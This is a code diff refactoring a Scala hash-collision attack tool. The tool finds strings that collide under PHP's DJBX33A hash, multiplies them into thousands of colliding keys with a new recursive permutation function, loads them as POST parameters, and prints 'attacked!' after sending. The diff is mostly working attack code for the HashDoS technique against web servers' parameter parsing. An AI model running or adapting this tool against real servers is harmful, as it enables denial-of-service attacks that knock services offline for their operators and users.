@@ -23,7 +23,7 @@ object Collision {
 	def main(args: Array[String]) {
 		val numIterations = charset.length * charset.length
 		var collisions = List[String]()
-		val collisionExponent = 9
+		val collisionLen = 9
 		val hashFun = phpHash _
 
 		println("Searching for at least three colliding strings")
@@ -38,9 +38,9 @@ object Collision {
 		println(collisions.map("\"" + _ + "\"").mkString(", "))
 		println("For hashcode " + hashFun( collisions.head ) )
 
-		println("Generating %d^%d = %.0f derived collisions".format(collisions.length, collisionExponent, math.pow(collisions.length, collisionExponent)))
+		println("Generating %d^%d = %.0f derived collisions".format(collisions.length, collisionLen, math.pow(collisions.length, collisionLen)))
 
-		val manyCols = makeCollisions(collisions.toArray, collisionExponent)
+		val manyCols = permutations(collisions, collisionLen)
 
 		postParams = manyCols.toList.map( (_, "a") )
 
@@ -49,21 +49,9 @@ object Collision {
     	println("attacked!")
 	}
 
-	def makeCollisions(baseCols: Array[String], raisedTo: Int) = {
-		val state = (1 to raisedTo).map(t => 0).toArray
-		val res = collection.mutable.ListBuffer[String]()
-
-		while(1 + res.length < math.pow(baseCols.length, raisedTo) ) {
-			res += (0 until raisedTo).map(t => baseCols(state(t))).mkString
-			state(state.length - 1) += 1
-			(state.length - 1 to 0 by -1).foreach( i => {
-				if(state(i) >= baseCols.length) {
-					state(i) = 0
-					state(i - 1) += 1
-				}
-			})
-		}
-		res
+	def permutations(items: List[String], len: Int): List[String] = {
+		if(len == 1) items
+		else permutations(items, len - 1).flatMap(s => items.map(_ + s))
 	}
 
 	def StringFromInt(n: Int): String = {
@@ -77,6 +65,4 @@ object Collision {
 	def javaHash(s: String) = s.map(_.toInt).reduceLeft( (hash, next) => hash * 31 + next)
 
 	def phpHash(s: String) = s.map(_.toInt).foldLeft(5381)( (hash, next) => hash * 33 + next)
-
-
 }
